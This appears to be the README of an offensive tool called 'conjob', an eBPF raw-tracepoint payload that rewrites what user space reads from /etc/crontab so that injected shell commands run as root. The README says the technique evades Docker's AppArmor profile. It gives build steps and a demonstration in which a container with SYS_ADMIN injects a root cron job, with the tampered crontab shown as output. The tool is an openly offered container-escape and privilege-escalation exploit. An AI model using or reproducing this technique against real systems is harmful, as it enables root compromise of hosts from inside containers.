# obie-trice-conjob

> _"And Moby, you can get stomped by Obie"_ -Eminem

libbpf/bpf_load-based raw tracepoint eBPF privesc payload that intercepts reads
for `/etc/crontab` to inject arbitrary shell commands into the data read back
by user space. Because it uses the raw tracepoint API, it does not rely on
sysfs (`/sys/**`) and is therefore not blocked by Docker's AppArmor profile.

***Note:*** The build toolchain is a slightly modified version of the one from
[xdp-project/xdp-tutorial](https://github.com/xdp-project/xdp-tutorial).
Additionally, `common/bpf_load.{c,h}` are sourced from
[`linux/samples/bpf`](https://github.com/torvalds/linux/tree/master/samples/bpf).

## Dependencies

```bash
# on Ubuntu 18.04
$ sudo apt-get install build-essential clang llvm git libelf-dev xxd
```

## Usage

```bash
$ git submodule update --init # pulls in libbpf/
$ make
$ file conjob
conjob: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 3.2.0, BuildID[sha1]=fbefdcf7c3c9263cf6fa7d132304e2593787baa8, stripped
$ sudo docker run -it --cap-add SYS_ADMIN -v $(pwd):/tmp:ro alpine:latest sh  
/ # /tmp/conjob '( echo "# id" ; id ) > /tmp/conjob'
loaded...

```

```bash
$ cat /etc/crontab
SHELL=/bin/sh
* * * * * root ( echo "# id" ; id ) > /tmp/conjob
###############################################################################
###############################################################################
###############################################################################
###############################################################################
###############################################################################
###############################################################################
###############################################################################
###############################################################################
#########################
```
